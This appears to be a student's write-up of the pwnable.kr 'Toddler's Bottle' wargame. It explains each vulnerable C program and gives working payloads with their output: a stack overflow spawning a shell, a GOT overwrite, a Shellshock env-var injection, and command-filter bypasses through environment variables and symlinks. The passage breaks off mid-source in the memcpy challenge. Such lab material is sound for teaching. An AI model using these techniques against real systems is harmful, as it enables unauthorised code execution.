---
title: Pwnable.kr Writeup [Toddler's bottle]
tags: assignment3 wargame ctf writeup pwnable pwnable.kr
---
## 0. fd
fd.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```
file descriptor

0 : standard input
1 : standard output
2 : standard error

fd has to be 0 to save input in buffer

fd - 0x1234 = 0
fd = 0x1234 = 4660

```bash
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

## 1. collision
col.c
```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```
check_password reads input as 4 byte integer array and returns the sum of it
so, the passcode has to be:
1. not contain null byte or \x20
2. has the same sum as hashcode

> payload : '\x11\x11\x11\x01'*4 + '\xa8\xc5\x98\x1d'

```bash
col@ubuntu:~$ ./col `python -c "print '\x11\x11\x11\x01'*4 + '\xa8\xc5\x98\x1d'"`
daddy! I just managed to create a hash collision :)
```

## 2. bof

bof.c
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
the program gets input by gets@plt: input size is unlimited: bof possible
parameter 'key' should be stored at the $ebp+8 because cdecl.
by dissassembling the binary, i found out the buffer size is 44 bytes

payload: 'a'*(44+8) + '\xbe\xba\xfe\xca'

```bash
junheah@DESKTOP-RU0PI5L:~$ (python -c "print 'a'*(44+8) + '\xbe\xba\xfe\xca\n'";cat) | nc pwnable.kr 9000

whoami
bof
cat flag
daddy, I just pwned a buFFer :)
```

## 3. flag
when binary file is loaded to gdb, no function is shown.
The binary has to be packed
```bash
junheah@DESKTOP-RU0PI5L:$ hexdump -C flag | grep -C 1 UPX
000000a0  00 00 00 00 00 00 00 00  00 00 20 00 00 00 00 00  |.......... .....|
000000b0  fc ac e0 a1 55 50 58 21  1c 08 0d 16 00 00 00 00  |....UPX!........|
000000c0  21 7c 0d 00 21 7c 0d 00  90 01 00 00 92 00 00 00  |!|..!|..........|
--
0004a660  73 20 66 69 6c 65 20 69  73 20 70 61 63 6b 65 64  |s file is packed|
0004a670  20 77 69 74 68 20 74 68  65 20 55 50 58 20 65 78  | with the UPX ex|
0004a680  65 63 75 74 61 62 6c 65  20 70 61 63 6b 65 72 20  |ecutable packer |
0004a690  68 74 74 70 3a 2f 2f 75  70 78 2e 73 66 2e 6e 65  |http://upx.sf.ne|
0004a6a0  74 20 24 0a 00 24 49 64  3a 20 55 50 58 20 33 2e  |t $..$Id: UPX 3.|
0004a6b0  30 38 20 43 6f 70 79 72  69 67 68 74 20 28 43 29  |08 Copyright (C)|
--
```
By doing a bit of examination, we can find out that it is packed with upx

Lets unpack this binary

```bash
junheah@ubuntu:~/Desktop/upx-3.95-amd64_linux$ ./upx -d ../flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.
```
now the binary is ready for disassembly
```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:	push   rbp
   0x0000000000401165 <+1>:	mov    rbp,rsp
   0x0000000000401168 <+4>:	sub    rsp,0x10
   0x000000000040116c <+8>:	mov    edi,0x496658
   0x0000000000401171 <+13>:	call   0x402080 <puts>
   0x0000000000401176 <+18>:	mov    edi,0x64
   0x000000000040117b <+23>:	call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:	mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:	mov    rsi,rdx
   0x0000000000401192 <+46>:	mov    rdi,rax
   0x0000000000401195 <+49>:	call   0x400320
   0x000000000040119a <+54>:	mov    eax,0x0
   0x000000000040119f <+59>:	leave  
   0x00000000004011a0 <+60>:	ret    
End of assembler dump.
gdb-peda$ x/wx 0x6c2070
0x6c2070 <flag>:	0x00496628
gdb-peda$ x/s 0x00496628
0x496628:	"UPX...? sounds like a delivery service :)"
```

## 4. passcode
passcode.c
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

as we can see, the scanf is not used properly. So, the input is saved to dummy address inside passcode1 and passcode2. But luckily, we can overwrite the dummy value beforehand when welcome is called.

Let's just overwrite with the address to int that is used for cmp

following is the passcode:

first passcode: 0x528e6
second passcode: 0xcc07c9

welcome function saves input to ebp-0x70 while passcode1/2 is stored in ebp-0x10 and ebp-0xc. ebp is same in both function calls.

overwrite passcode1: ``'a'*96 + '\xe6\x28\x05\x00\n'``

But we run into a problem, input length is 100 so ebp-0xc cannot be overwritten.

However we are able to change first scanf destination. But where?

```
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    DWORD PTR ds:0x804a004
   0x08048436 <+6>:     push   0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
```
plt functions have jmp instruction inside them. By changing the dest for jmp, we can change the program flow

Lets change the destination to ``fflush@got`` (the jump destination for fflush@got) and overwrite it with ``0x80485e3`` (push /bin/sh; call system@plt)

payload : ``'a'*96 + '\x04\xa0\x04\x08\n134514147\n'``

```bash
passcode@ubuntu:~$ python -c "print 'a'*96 + '\x04\xa0\x04\x08\n134514147\n'" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa╝�!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```

## 5. random
random.c
```c
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
```
the random function doesn't use any seed, leading it to return the same number everytime its been executed.
By debugging i found that random is 0x6b8b4567. Xor with 0xdeadbeef produces 0xb526fb88

```bash
random@ubuntu:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...
```

## 6. input
input.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
        printf("Welcome to pwnable.kr\n");
        printf("Let's see if you know how to give input to program\n");
        printf("Just give me correct inputs then you will get the flag :)\n");

        // argv
        if(argc != 100) return 0;
        if(strcmp(argv['A'],"\x00")) return 0;
        if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
        printf("Stage 1 clear!\n");

        // stdio
        char buf[4];
        read(0, buf, 4);
        if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
        read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
        printf("Stage 2 clear!\n");

        // env
        if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
        printf("Stage 3 clear!\n");

        // file
        FILE* fp = fopen("\x0a", "r");
        if(!fp) return 0;
        if( fread(buf, 4, 1, fp)!=1 ) return 0;
        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
        fclose(fp);
        printf("Stage 4 clear!\n");

        // network
        int sd, cd;
        struct sockaddr_in saddr, caddr;
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd == -1){
                printf("socket error, tell admin\n");
                return 0;
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = INADDR_ANY;
        saddr.sin_port = htons( atoi(argv['C']) );
        if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                printf("bind error, use another port\n");
                return 1;
        }
        listen(sd, 1);
        int c = sizeof(struct sockaddr_in);
        cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
        if(cd < 0){
                printf("accept error, tell admin\n");
                return 0;
        }
        if( recv(cd, buf, 4, 0) != 4 ) return 0;
        if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
        printf("Stage 5 clear!\n");

        // here's your flag
        system("/bin/cat flag");
        return 0;
}
```

We just have to give correct input values in correct way and order.


first stage:
1. argv[ord('A')] = '\x00'
2. argv[ord('B')] = '\x20\x0a\x0d'

argvs = `` ['/home/input2/input'] + ['a']*64 + ['\x00'] + ['\x20\x0a\x0d'] + ['a']*33 ``

second stage:
1. stdin << '\x00\x0a\x00\xff'
2. stderr << '\x00\x0a\x02\xff'

we can easily pass input through stdin, but how about stderr? fortunately, pwntool lets you change the file descriptor for stderr when opening a process

third stage:
1. env['\de\xad\xbe\ef'] = '\xca\xfe\xba\xbe'

pwntool also allows you to manipulate environment variables for your process

fourth stage:
1. file with name '\x0a' = '\x00\x00\x00\x00'

this can be solved by just creating the file in the execution directory.

fifth stage:

1. opens a socket to read from
2. the port for the socket is argv['C']

we could also solve this by using pwntool's ``remote``



final payload:
```python
from pwn import*

port = 11317

#file content : \x00\x0a\x02\xff
f = open('stage2','r')

#create file for stage 4
f2 = open('\x0a','w')
f2.write('\x00\x00\x00\x00')
f2.close()

envs = {'\xde\xad\xbe\xef':'\xca\xfe\xba\xbe'}

#stage 1
args = ['/home/input2/input'] + ['a']*64 + ['\x00'] + ['\x20\x0a\x0d'] +[str(port)] + ['a']*32
p = process(argv = args, stderr = f, env = envs)
print p.recvuntil('clear!')

#stage 2
p.send('\x00\x0a\x00\xff')
print p.recvuntil('clear!')

#stage 3
#environment is already passed through proccess
print p.recvuntil('clear!')

#stage 4
#file is already created
print p.recvuntil('clear!')

#stage 5
#delay for socket
sleep(3)
m = remote('127.0.0.1', port)
m.send('\xde\xad\xbe\xef')
m.close()

p.interactive()
```


```bash
input2@ubuntu:/tmp/jtmp$ ln -s /home/input2/flag flag
input2@ubuntu:/tmp/jtmp$ python exploit.py
[+] Starting local process '/home/input2/input': Done
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!

Stage 2 clear!

Stage 3 clear!

Stage 4 clear!
[+] Opening connection to 127.0.0.1 on port 11317: Done
[*] Closed connection to 127.0.0.1 port 11317
[*] Switching to interactive mode

Stage 5 clear!
Mommy! I learned how to pass various input in Linux :)
```

## 7. leg
```nasm
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0     
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr          ;
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
(gdb)
```

This problem has inline arm assembly.

The program compares user input with the sum of <key1>,<key2>,<key3>. So we just have to find out the return values of these functions.

Before looking at the assembly code itself, we have to know arm's isa.

Here are a few things about asm assembly that I found useful:

- arm has two modes: ARM and THUMB

|mode|registers|code length|
|--|--|--|
|ARM|R0~R15 (16)|4 bytes|
|THUMB|R0~R7 (8)|2 bytes|

- registers
 - R0~R12 : general registers
 - R13 (SP) : Stack pointer (=esp)
 - R14 (LR) : Link register (contains return address for current function)
 - PC : Program counter (=eip)


- instructions

|instruction|operand|what it does|
|--|--|--|
|BL|1|calls function in 1|
|BX|1|calls function in 1 and toggle ARM/THUMB mode|
|ADD, SUB, ..|3|add/sub/.. 2, 3 and save result to 1|

all functions return values by register r0, so I assumed the values to be:

|function|return|
|--|--|
|key1|0x8cdc+4|
|key2|0x8d04+2+4|
|key3|0x8d7c+4|
|sum|108,394|

But 108394 doesn't work. Why?

It turns out that PC doesn't work exactly like EIP.

Unlike x86 processor, arm processor goes through multiple stages when executing an instruction. The stages differ according to the processor, but they all contain these three basic steps:

1. fetch
2. decode
3. execute

> ARMv7 ueses 3 stages, ARMv9 uses 5, ARM11 uses 8, CortexA8 uses 13. The increasing of stage count is for faster code execution.

The ARM cpu has multiple sections that is specialized for each of these stages. Assuming that it takes one cycle per stage, it takes 15 cycles to execute 5 instructions. This is inefficient because only 1 section is used per cycle. And to avoid such waste, ARM uses a thing called ``pipeline``.

normal (9 cycles):

|1|2|3|4|5|6|7|8|9|
|-|-|-|-|-|-|-|-|-|
|F|D|E|F|D|E|F|D|E|

<!-- <table>
	<tr>
    <td>Fetch</td>
    <td>Decode</td>
    <td>Execute</td>
    <td>Fetch</td>
    <td>Decode</td>
    <td>Execute</td>
    <td>Fetch</td>
    <td>Decode</td>
    <td>Execute</td>
    </tr>
</table> -->

using pipeline (5 cycles):

|1|2|3|4|5|6|7|8|9|
|-|-|-|-|-|-|-|-|-|
|F|D|E|||||||
||F|D|E||||||
|||F|D|E|||||

<!-- <table>
<tr>
<td>Fetch</td>
<td>Decode</td>
<td>Execute</td>
</tr>
<tr>
<td></td>
<td>Fetch</td>
<td>Decode</td>
<td>Execute</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Fetch</td>
<td>Decode</td>
<td>Execute</td>
</tr>
</table> -->

And PC contains the address for fetch stage, which would be current instruction+2 not +1 like I calculated before.

Let's recalculate the value:

|function|return|
|--|--|
|key1|0x8cdc+8|
|key2|0x8d04+4+4|
|key3|0x8d7c+4|
|sum|108,400|

```bash
/ $ ./leg
Daddy has very strong arm! : 108400
Congratz!
My daddy has a lot of ARMv5te muscle!
```

## 8. mistake
mistake.c
```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```
The hint given was ``operator priority``

Becase comparator operator has higher priority than assignment operator, the first if statement should go something like this:
```
fd = (fd=open(...) < 0)
fd = false
```
false is 0 in C, so the the second if statement (with read function inside) is not reading from file, but from stdin.

So, this is what we have to do:
1. input random string with length of 10 > pw_buf
2. input xor result of first input > pw_buf2

payload: `` python -c "print 'a'*10 + '\n' + chr(ord('a')^1)*10 + '\n'"``

```bash
mistake@ubuntu:~$ python -c "print 'a'*10 + '\n' + chr(ord('a')^1)*10 + '\n'" | ./mistake
do not bruteforce...
input password : Password OK
Mommy, the operator priority always confuses me :(
```

## 9. shellshock
shellshock.c
```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

shellshock is a vulnerability in the unix shell

```bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

This specially crafted environment variable makes the ``ehco vulnerable`` get executed rather than ``echo this is a test``.

payload: ``export x='() { :;}; /bin/cat flag'``

```bash
shellshock@ubuntu:~$ ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```

## 10. coin1
```

        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.

        - How to play -
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

        - Ready? starting in 3 sec... -

N=828 C=10
```

## 11.blackjack
```
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?


Running at : nc pwnable.kr 9009
```
user gets prompted to input bet every game. If user loses, selected amount of money gets subtracted from balance.

```c++
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);

 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```
But the problem is that this ``bet`` value can be negative number, which upon losing, ends up adding balance to user's cash.

```
Cash: $500
-------
|C    |
|  6  |
|    C|
-------

Your Total is 6

The Dealer Has a Total of 4

Enter Bet: $-9999999999

...

Dealer Has the Better Hand. You Lose.

You have 0 Wins and 1 Losses. Awesome!

Would You Like To Play Again?
Please Enter Y for Yes or N for No
y
[2J[1;1HYaY_I_AM_A_MILLIONARE_LOL


Cash: $1410065907

```

## 12.lotto
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
```

this program reads 6 bytes from ``/dev/urandom`` and compares with user input

the for loop for checking lotto numbers is faulty. The for block loops 36 times, incrementing ``match`` for every input byte that contains any byte of generated lotto bytes. We could make the ``match`` 6 with only one correct byte, by duplicating the one correct byte. With the increased chances, we could solve this by brute-bruteforcing.

payload:

```python
from pwn import *

context.log_level='debug'

p = process('/home/lotto/lotto')

while(True):
        p.recvuntil('Exit\n')
        p.sendline('1')
        p.recvuntil(' : ')
        p.sendline('\x01\x01\x01\x01\x01\x01')
        print p.recvuntil('bad luck.')
```

result:

```
[+] Starting local process '/home/lotto/lotto': Done
[DEBUG] Received 0x2e bytes:
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Submit your 6 lotto bytes : '
[DEBUG] Sent 0x7 bytes:
    00000000  01 01 01 01  01 01 0a                               │····│···│
    00000007
[DEBUG] Received 0xd bytes:
    'Lotto Start!\n'
[DEBUG] Received 0x37 bytes:
    'sorry mom... I FORGOT to check duplicate numbers... :(\n'
[DEBUG] Received 0x2e bytes:
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
```

## 13. cmd1
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

just pass every filtered text via environment variables.

```
cmd1@ubuntu:~$ export c=/bin/cat
cmd1@ubuntu:~$ export f=/home/cmd1/flag
cmd1@ubuntu:~$ ./cmd1 "\$c \$f"
mommy now I get what PATH environment is for :)
```

## 14. cmd2
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```
We could get ``/`` from ``${PWD}``
By using dynamic link, I was able to bypass the filter

```bash
cmd2@prowl:/tmp/jun2$ ln -s /bin/cat c
cmd2@prowl:/tmp/jun2$ ln -s /home/cmd2/flag f
```
```bash
cmd2@prowl:/$ ~/cmd2 "\${PWD}tmp\${PWD}jun2\${PWD}c \${PWD}tmp\${PWD}jun2\${PWD}f"
${PWD}tmp${PWD}jun2${PWD}c ${PWD}tmp${PWD}jun2${PWD}f
FuN_w1th_5h3ll_v4riabl3s_haha
```

## 15.memcpy
```c
// compiled with : gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
        asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
	int i;
	for (i=0; i<len; i++) {
		dest[i] = src[i];
	}
	return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
	size_t i;
	// 64-byte block fast copy
	if(len >= 64){
		i = len / 64;
		len &= (64-1);
		while(i-- > 0){
			__asm__ __volatile__ (
			"movdqa (%0), %%xmm0\n"
			"movdqa 16(%0), %%xmm1\n"
			"movdqa 32(%0), %%xmm2\n"
			"movdqa 48(%0), %%xmm3\n"
			"movntps %%xmm0, (%1)\n"
			"movntps %%xmm1, 16(%1)\n"
			"movntps %%xmm2, 32(%1)\n"
			"movntps %%xmm3, 48(%1)\n"
			::"r"(src),"r"(dest):"memory");
			dest += 64;
			src += 64;
		}
	}

	// byte-to-byte slow copy
	if(len) slow_memcpy(dest, src, len);
	return dest;
}

int main(void){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Hey, I have a boring assignment for CS class.. :(\n");
	printf("The assignment is simple.\n");

	printf("-----------------------------------------------------\n");
	printf("- What is the best implementation of memcpy?        -\n");
	printf("- 1. implement your own slow/fast version of memcpy -\n");
	printf("- 2. compare them with various size of data         -\n");
	printf("- 3. conclude your experiment and submit report     -\n");
	printf("-----------------------------------------------------\n");

	printf("This time, just help me out with my experiment and get flag\n");
	printf("No fancy hacking, I promise :D\n");

	unsigned long long t1, t2;
	int e;
	char* src;
	char* dest;
	unsigned int low, high;
	unsigned int size;
	// allocate memory
	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
